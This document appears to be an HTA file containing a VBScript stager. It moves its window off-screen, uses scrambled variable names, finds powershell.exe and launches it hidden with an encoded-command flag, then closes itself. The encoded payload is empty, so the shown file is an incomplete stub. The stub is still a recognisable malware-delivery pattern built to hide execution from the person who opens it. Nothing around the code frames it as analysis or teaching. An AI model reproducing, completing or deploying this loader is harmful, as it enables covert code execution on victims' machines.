<script language="VBScript">
  window.moveTo -4000, -4000
  Set avn5gPJeTi = CreateObject("Wscript.Shell")
  Set jlZy4 = CreateObject("Scripting.FileSystemObject")
  For each path in Split(avn5gPJeTi.ExpandEnvironmentStrings("%PSModulePath%"),";")
    If jlZy4.FileExists(path + "\..\powershell.exe") Then
      avn5gPJeTi.Run "powershell.exe -nop -w hidden -e ",0
      Exit For
    End If
  Next
  window.close()
</script>
